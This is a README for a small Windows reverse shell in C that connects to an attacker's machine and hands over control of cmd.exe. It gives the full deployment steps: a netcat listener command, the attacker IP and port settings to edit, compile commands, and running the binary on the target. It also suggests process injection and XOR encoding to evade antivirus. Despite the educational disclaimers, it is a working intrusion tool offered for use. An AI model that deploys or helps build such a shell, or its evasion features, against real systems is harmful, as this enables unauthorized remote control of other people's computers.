Simple Reverse Shell in C
A minimal reverse shell written in C for Windows. The program establishes a TCP connection to a remote attacker's machine, redirecting cmd.exe input/output for remote control.

⚠ Warning: This project is intended for educational and authorized penetration testing purposes only. Unauthorized use is illegal.




Features
✅ Connects to a remote listener (attacker's machine)
✅ Redirects standard input/output to the attacker's terminal
✅ Works on Windows (uses winsock2.h)
✅ Simple and lightweight (~10 KB compiled)

Usage
1. Start a Listener on the Attacker's Machine
Use Netcat (nc) to listen for incoming connections:


nc -lvnp 4444
🔹 Replace 4444 with the port number you plan to use.

2. Modify and Compile the Reverse Shell


Edit reverse_shell.c and change:

#define REMOTE_IP "192.168.1.100"  // Change to your attacker's IP
#define REMOTE_PORT 4444           // Change to your listening port
Compile using MinGW (GCC for Windows):


x86_64-w64-mingw32-gcc reverse_shell.c -o reverse_shell.exe -lws2_32
or using Microsoft Visual Studio:
cl reverse_shell.c ws2_32.lib


3. Run the Reverse Shell on the Target Machine
Execute the compiled reverse_shell.exe:


reverse_shell.exe
Once executed, the target machine will connect to the attacker's listener.

4. Get Control of the Target Machine
After the connection is established, the attacker's Netcat shell will allow remote command execution.

Code Explanation
The key parts of reverse_shell.c:

Winsock Initialization (WSAStartup())
Sets up Windows networking for socket communication.
Socket Connection (connect())
Connects to the attacker's IP and port.
I/O Redirection (CreateProcess())
Redirects standard input/output to the attacker's machine.
Cleanup (WSACleanup())
Ensures proper release of network resources.
Disclaimer


🚨 Legal Warning:
This software is provided for educational purposes only. Unauthorized use, hacking, or deploying this code on systems without permission is illegal and may result in severe penalties.

⚠ Use this tool only with explicit authorization from the target system owner.
By using this software, you agree that the authors are not responsible for any misuse or illegal activities.

Next Steps
🔹 Stealth Mode: Hide process execution using process injection.
🔹 Encoding: Evade antivirus detection using XOR encryption.
🔹 Portability: Modify for Linux/Mac compatibility.

